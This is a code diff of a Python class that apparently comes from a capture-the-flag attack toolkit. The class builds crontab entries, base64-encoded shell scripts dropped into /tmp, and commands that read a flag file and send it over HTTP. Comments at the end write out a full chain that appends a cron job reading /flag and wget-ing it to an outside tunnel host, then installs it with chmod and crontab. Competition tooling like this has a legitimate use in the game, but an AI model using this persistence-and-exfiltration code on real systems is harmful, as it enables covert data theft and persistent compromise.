@@ -1,16 +1,33 @@
 import hashlib
 import base64
+import time
 class CmdBuilder:
-    def __init__(self,cmd_tpl):
-        self.cmd_tpl=cmd_tpl
-    def buildShByModel(url,payload,httpType='default'):
-        return config.self.cmd_tpl[httpType].format(url,payload)
-    def buildCrontab(interval,url,payload,httpType=0):
-        #payload='flag="$(cat /home/web/flag/flag)"&token={token}'
-        model=buildShByModel(url,payload,httpType)
-        raw= f"{interval} * * * * {model}"
+    def __init__(self):
+        pass
+    @staticmethod
+    def buildCrontab(interval,shcmd):
+        raw= f"{interval} * * * * {shcmd}"
         return raw
+    @staticmethod
     def buildCmd(rawCmd):
         raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
         md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
         return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/{md5Str}.sh',md5Str
+    @staticmethod
+    def buildAutoSubmitFlagCmd(tpl,requestinfo):
+        method=requestinfo['method']
+        action=tpl['method'][method]
+        url=tpl['url'].format(
+            requestinfo['url'].format(
+                requestinfo['token'],
+                "\"$f\""),
+            f'{requestinfo["payload"]}'
+            )
+        cmd = f'f=`{requestinfo["flagcmd"]}`;\n{url}'
+        print(cmd)
+        return cmd
+
+# echo "*/1 * * * * /bin/sh \"f=\`cat /flag\`\nwget \"http://edprin.natappfree.cc?token=serfend&flag=\$f\"\"">>/app/444.sh
+# chmod 755 /app/444.sh
+# /usr/bin/crontab /app/444.sh
+
